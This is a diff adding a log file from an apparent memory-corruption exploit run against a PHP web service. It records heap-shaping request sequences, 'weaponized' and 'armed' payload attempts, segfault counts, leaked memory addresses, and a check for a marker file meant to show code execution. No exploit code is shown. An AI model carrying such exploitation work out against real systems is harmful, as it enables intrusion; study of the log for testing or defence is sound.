@@ -1,0 +1,51 @@
+=== oom118: shape-law test (98-era replica + values reach) ===
+[boot] md5=ce1f3c48 x=ls: cannot access '/tmp/x': No such file
+core limits: Max core file size        0                    unlimited            bytes
+--- phase 1: 98-era sequence verbatim (weaponized x3 last) ---
+  [p1] warm k1=1900: 200
+  [p1] warm k1=1950: 200
+  [p1] warm k1=2000: URLError
+  [p1] warm k1=2044: 200
+  [p1] warm k1=2100: 200
+  [p1] warm k1=2200: URLError
+  [p1] warm k1=2400: TimeoutError
+  [p1] warm k1=2600: URLError
+  [p1] warm k1=2800: URLError
+  [p1] warm k1=3000: URLError
+  [p1] warm k1=3200: URLError
+  [p1] SACRIFICE: ConnectionResetError
+  [p1] benign0: 200
+  [p1] benign1: 200
+  [p1] shaping done, segv delta=4
+  wpn0: RemoteDisconnected (0.5s) 'Remote end closed connection without response'
+  wpn1: 200 (1.5s) '<br />\n<b>Fatal error</b>:  Allowed memory size of 8388608 bytes exhausted (trie'
+  wpn2: 200 (0.3s) '<br />\n<b>Fatal error</b>:  Allowed memory size of 8388608 bytes exhausted (trie'
+phase1 segv_total=5 wpn_codes=['RemoteDisconnected', '200', '200']
+PHASE1 VERDICT: crashes=5 core=False rdi=None
+--- phase 2: recreate -> shape -> measure -> armed values fire ---
+[boot2] md5=ce1f3c48 x=ls: cannot access '/tmp/x': No such file
+  [p2] warm k1=1900: 200
+  [p2] warm k1=1950: 200
+  [p2] warm k1=2000: URLError
+  [p2] warm k1=2044: 200
+  [p2] warm k1=2100: 200
+  [p2] warm k1=2200: URLError
+  [p2] warm k1=2400: URLError
+  [p2] warm k1=2600: URLError
+  [p2] warm k1=2800: URLError
+  [p2] warm k1=3000: URLError
+  [p2] warm k1=3200: URLError
+  [p2] SACRIFICE: URLError
+  [p2] benign0: 200
+  [p2] benign1: 200
+  [p2] shaping done, segv delta=4
+base=0x7fc199343000
+  marker post: 200
+C0=0x7fc196a01718 strides=['0x18', '0x30', '0x48']
+B=0x7fc196a0d108 (part 13 +0x3f0) nib8=8 bit8=1 bit9=0
+  ARMED: TimeoutError (60.4s) 'timed out'
+PHASE2 VERDICT: crashes=4 core=False rdi=None x=cat: /tmp/x: No such file or directory
+=== SUMMARY ===
+P1 98-era replica: crashes=5 rdi=None
+P2 shaped+values:  crashes=4 rdi=None x=cat: /tmp/x: No such file or directory
+=== done ===
